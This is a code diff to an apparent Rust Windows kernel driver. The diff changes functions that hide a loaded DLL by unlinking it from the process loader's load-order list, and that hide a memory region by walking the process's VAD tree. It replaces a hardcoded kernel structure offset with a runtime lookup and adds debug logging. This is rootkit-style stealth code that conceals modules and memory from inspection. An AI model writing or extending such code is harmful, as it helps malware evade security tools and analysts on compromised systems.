@@ -3,17 +3,20 @@ use {
     ntapi::{ntldr::LDR_DATA_TABLE_ENTRY, ntpebteb::PEB}, 
     shared::structs::{ModuleInfo, TargetModule, TargetProcess}, 
     wdk_sys::{
-        ntddk::IoGetCurrentProcess, 
+        ntddk::IoGetCurrentProcess, _MODE::KernelMode,
         FILE_OBJECT, NTSTATUS, POOL_FLAG_NON_PAGED, RTL_BALANCED_NODE, 
-        STATUS_INVALID_ADDRESS, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL, 
-        _MODE::KernelMode
+        STATUS_INVALID_ADDRESS, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL,
     },
     crate::{
         internals::{
             structs::MMVAD_SHORT, vad::MMVAD, 
             externs::{MmCopyVirtualMemory, PsGetProcessPeb}
         }, 
-        process::Process, utils::{pool::PoolMemory, process_attach::ProcessAttach}
+        process::Process, 
+        utils::{
+            pool::PoolMemory, process_attach::ProcessAttach,
+            offsets::get_vad_root,
+        }
     }, 
 };
 
@@ -162,7 +165,9 @@ impl Module {
                 return Err(STATUS_UNSUCCESSFUL);
             }
 
-            let dll_name = alloc::string::String::from_utf16_lossy(buffer);    
+            let dll_name = alloc::string::String::from_utf16_lossy(buffer);
+            log::info!("==> {}", module_name.contains(&dll_name.to_lowercase()));
+            log::info!("==> {}", module_name);
             if module_name.contains(&dll_name.to_lowercase()) {
                 // Removes the module from the load order list
                 Self::remove_link(&mut (*list_entry).InLoadOrderLinks);
@@ -198,8 +203,9 @@ impl Module {
     /// - `NTSTATUS`: Returns `STATUS_SUCCESS` if the VAD is successfully hidden, otherwise returns an appropriate error status.
     ///
     pub unsafe fn hide_object(target_address: u64, target_eprocess: Process) -> Result<(), NTSTATUS> {
-        let vad_root = 0x7d8;
-        let vad_table = target_eprocess.e_process.cast::<u8>().offset(vad_root) as *mut RTL_BALANCED_NODE;
+        let vad_root = get_vad_root();
+        log::info!("{:x}", vad_root);
+        let vad_table = target_eprocess.e_process.cast::<u8>().offset(vad_root as isize) as *mut RTL_BALANCED_NODE;
         let current_node = vad_table;
 
         // Uses a stack to iteratively traverse the tree
